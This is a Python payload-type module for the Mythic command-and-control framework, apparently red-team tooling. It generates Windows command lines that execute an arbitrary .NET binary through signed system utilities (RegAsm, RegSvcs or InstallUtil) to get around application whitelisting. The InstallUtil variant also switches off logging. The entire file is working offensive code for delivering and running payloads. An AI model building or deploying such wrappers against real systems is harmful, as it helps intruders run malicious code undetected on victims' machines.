import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os


class lolbas_exec_dotnet(PayloadType):
    name = "lolbas_exec_dotnet"
    file_extension = "cmd"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    note = """Execute a .Net binary via regasm, regsvc or installutil"""
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "cmd"
    agent_icon_path = agent_path / "agent_functions" / "cmd.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(
            name = "lolbas",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["regasm_unregisterclass", "regasm_registerclass", "regsvcs_unregisterclass", "regsvcs_registerclass", "installutil"], 
            description="LOLBAS to use",
        ),
        BuildParameter(
            name = "binary",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="Override binary path",
        ),
        BuildParameter(
            name = "dotnet_path",
            parameter_type=BuildParameterType.String,
            description=".Net binary Path",
        ),
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            lolbas = self.get_parameter('lolbas')
            binary = self.get_parameter('binary')
            dotnet_path = self.get_parameter('dotnet_path')

            if len(binary) == 0:
                if lolbas.startswith("regasm"):
                    binary = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe"
                elif lolbas.startswith("regsvcs"):
                    binary = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe"
                elif lolbas.startswith("installutil"):
                    binary = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe"

            if lolbas.endswith("_unregisterclass"):
                payload = "%s /U %s" % (binary, dotnet_path)
            elif lolbas.endswith("_registerclass"):
                payload = "%s %s" % (binary, dotnet_path)
            elif lolbas == "installutil":
                payload = "%s /logfile= /LogToConsole=false /U %s" % (binary, dotnet_path)

            resp.payload = payload
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
